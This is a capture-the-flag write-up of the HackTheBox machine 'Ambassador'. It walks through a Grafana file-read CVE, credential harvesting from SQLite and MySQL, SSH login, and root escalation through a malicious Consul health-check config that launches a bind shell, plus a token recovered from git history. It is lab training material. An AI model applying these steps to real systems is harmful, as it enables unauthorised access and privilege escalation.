---
title: "HTB Ambassador"
date: 2023-01-13T23:30:00+03:00
tags: ["hackthebox", "hackthebox-medium", "ctf"]
---

Ambassador is the medium difficulty hackthebox machine.

<!--more-->

## Enumeration

Running nmap tells us that there is Grafana on port 3000 and MySQL on port 3306.

By doing a quick google search we can find out that it's vulnerable to
unauthorized arbitrary file read attack
([CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)).

## Machine break-in

Then we exploit that vulerability to get `grafana.db` (see
[this](https://github.com/jas502n/Grafana-CVE-2021-43798) or
[this](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798) as
references).

As we can see, it's the sqlite3 db:
```shell-session
$ file grafana.db
grafana.db: SQLite 3.x database, last written using SQLite version 3035004 <...>
```

Next, open it with the `sqlite3` cli tool:
```shell-session {hl_lines=10}
$ sqlite3
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open grafana.db
sqlite> .tables
<...>
dashboard_version           temp_user
data_source                 test_data
kv_store                    user
<...>
```

We remember that we saw an open MySQL port, so we should be particularly
interested in the `data_source` table as it may contain some credentials.
Expectedly, it really does:
```shell-session
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||<password>|grafana|grafana|<...>
```

Next, log into MySQL:
```shell-session {hl_lines=15}
$ mariadb -h 10.10.11.183 -u grafana -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
<...>

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.075 sec)
```

There's one database with an attractive name, let's check it:
```shell-session {hl_lines=18}
MySQL [mysql]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.051 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | <b64pass>                                |
+-----------+------------------------------------------+
1 row in set (0.068 sec)
```

Looks like a base64 encoded string, why don't we try to decode?
```shell-session
$ echo <b64pass> | base64 -d
<pass>
```

And that's the correct password of the developer user!
```shell-session
$ ssh developer@10.10.11.183
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
<...>
```

The user flag is there, so we head for the root one.

## Privilege escalation

We can notice that we have write permissions on `/etc/consul.d/config.d`
directory (via regular enumeration, e.g. `find / -group developer 2>/dev/null |
grep -v proc`).
Also, if we look at the running processes, we can notice that `consul` is
started as `/usr/bin/consul agent -config-dir=/etc/consul.d/config.d
-config-file=/etc/consul.d/consul.hcl`.
A quick look at the [Consul documentation](
https://developer.hashicorp.com/consul/docs/agent/config/cli-flags#_config_dir)
tells us that any file in that directory with `.json` or `.hcl` suffix will be
sourced by Consul.

Further exploration tells that [we can write a check](
https://developer.hashicorp.com/consul/tutorials/developer-discovery/service-registration-health-checks#write-a-script-interval-check
) in json format that executes arbitrary local program.
Let's put a [bind shell](
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md#python
) in `/home/developer/bindshell.py` (don't forget the shebang!) and put an
appropriate check config to `/etc/consul.d/config.d` named e.g. `bindshell.json`.
It may look like:
```json
{
  "check": {
    "id": "bindshell",
    "name": "Bind Shell",
    "args": [
      "/home/developer/bindshell.py"
    ],
    "interval": "10s",
    "timeout": "600s"
  }
}
```

*(That's not the only way, however: somewhat easier would be, for example, to
place an SUID on bash.)*

Ok, we've placed our malicious configuration. Now we need Consul to read it.

Expectedly, it requires an access token for operations such as `reload`. Where
would we find one?

Well, in the home directory of `developer` there is `.gitconfig`, which suggests
that `/opt/my-app` is a git repository:
```shell-session {hl_lines=6}
$ cat .gitconfig
[user]
	name = Developer
	email = developer@ambassador.local
[safe]
	directory = /opt/my-app
```
In `/opt/my-app/whackywidget` we can see the MySQL credentials deployment script
that utilizes Consul. It lacks both Consul and MySQL credentials, however. Maybe
there is something interesting about that in git history? And there is! The last
commit removed the token from that script, so we can easily find it in diff with
`git show`:
```diff {hl_lines=16}
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token <token> whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Now running `consul reload -token=<token>` should be enough to make our bind
shell appear.

Subsequent actions are trivial.
